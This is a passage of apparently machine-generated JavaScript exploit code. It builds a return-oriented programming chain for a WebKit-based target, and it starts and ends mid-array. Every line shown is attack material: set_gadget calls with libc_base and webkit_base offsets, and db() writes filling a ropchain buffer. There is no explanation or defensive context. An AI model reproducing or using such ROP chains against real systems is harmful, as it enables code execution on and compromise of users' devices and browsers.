ropchain+75208, 
libc_base+811575, 
ropchain+75224, 
libc_base+811575, 
ropchain+85616, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+75344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+75360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+75504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+75472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+75488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+75576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+75632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([7, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+75760, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+75864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+75880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+76032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+76048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+76016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+76184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+76168, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+76304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76320, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+76408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+76464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+76584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+76600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+76776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+76744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+76728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+76832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+76936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+76968, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+76952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77128, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+77080, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+77184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+77288, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+77320, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77304, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77480, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+77432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+77536, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+77640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+77672, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77656, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+77760, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+77864, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+77848, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967283, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+78008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+78168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+78136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78152, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+78240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+78296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+78376, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+78480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+78648, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+78680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+78664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+78632, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+78800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+78816, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+78784, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+78904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+78960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+79080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+79112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+79096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+79272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+79240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+79224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+79328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+79432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+79464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+79624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+79576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+79680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+79784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+79816, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+79976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+79944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+79928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+80032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+80136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+80168, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+80240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+80256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+80416, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+80368, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+80472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+80576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+80608, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+80704, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+80688, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+80784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+80888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+80904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+81048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+81016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+81032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+81120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+81176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([7, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+81304, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+81408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+81424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+81576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+81608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+81592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+81560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+81728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+81744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+81712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+81848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+81864, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+81952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+82008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+82080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+82136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+82224, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967283, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+82328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+82344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+82504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+82472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+82456, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+82560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+82664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+82696, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+82680, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+82856, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+82824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+82808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+82912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+83016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+83048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83032, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+83120, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+83136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+83296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+83248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+83352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+83456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+83488, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+83584, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+83568, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+83664, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+83768, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+83784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+83928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+83896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+83912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+84000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+84056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+84136, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+84240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+84256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+84408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+84440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+84424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+84392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+84560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+84576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+84544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+84664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+84720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+84792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+84848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+84936, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+85040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+85056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+85208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+85240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+85224, 
